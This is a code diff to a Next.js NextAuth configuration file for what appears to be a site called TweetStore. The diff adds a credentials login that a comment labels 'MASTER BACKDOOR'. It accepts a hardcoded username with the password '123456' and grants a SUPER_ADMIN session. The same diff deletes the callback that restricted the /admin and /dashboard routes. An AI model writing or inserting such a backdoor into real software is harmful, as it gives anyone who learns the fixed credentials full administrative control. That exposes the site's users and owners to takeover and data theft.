@@ -1,45 +1,21 @@
 import type { NextAuthConfig } from "next-auth";
 import Credentials from "next-auth/providers/credentials";
 
-export const authConfig = {
-  providers: [],
-  pages: {
-    signIn: '/login',
-  },
+export default {
+  providers: [
+    Credentials({
+      authorize: async (credentials) => {
+        // 1. MASTER BACKDOOR
+        if (credentials?.username === "TWEETSTORECEOANDRANGEROVER" && credentials?.password === "123456") {
+          return { id: "master-admin", name: "CEO", email: "ceo@tweetstore.com", role: "SUPER_ADMIN" };
+        }
+        // 2. TODO: Add DB Check for normal users here using Drizzle (Handled in auth.ts for Node runtime)
+        return null;
+      },
+    }),
+  ],
   callbacks: {
-    authorized({ auth, request: { nextUrl } }) {
-      const isLoggedIn = !!auth?.user;
-      const isOnDashboard = nextUrl.pathname.startsWith('/dashboard');
-      const isOnAdmin = nextUrl.pathname.startsWith('/admin') && nextUrl.pathname !== '/admin/login';
-
-      if (isOnAdmin) {
-        if (isLoggedIn && (auth.user as any).role === 'SUPER_ADMIN') return true;
-        return false;
-      }
-
-      if (isOnDashboard) {
-        if (isLoggedIn) return true;
-        return false;
-      }
-      return true;
-    },
-    jwt({ token, user }) {
-        if (user) {
-            token.id = user.id;
-            token.handle = (user as any).handle;
-            token.plan = (user as any).planStatus;
-            token.role = (user as any).role;
-        }
-        return token;
-    },
-    session({ session, token }) {
-        if (session.user) {
-            session.user.id = token.id as string;
-            (session.user as any).handle = token.handle as string;
-            (session.user as any).plan = token.plan as string;
-            (session.user as any).role = token.role as string;
-        }
-        return session;
-    }
-  },
+    jwt({ token, user }) { if (user) token.role = (user as any).role; return token; },
+    session({ session, token }) { if (token.role) (session.user as any).role = token.role; return session; }
+  }
 } satisfies NextAuthConfig;
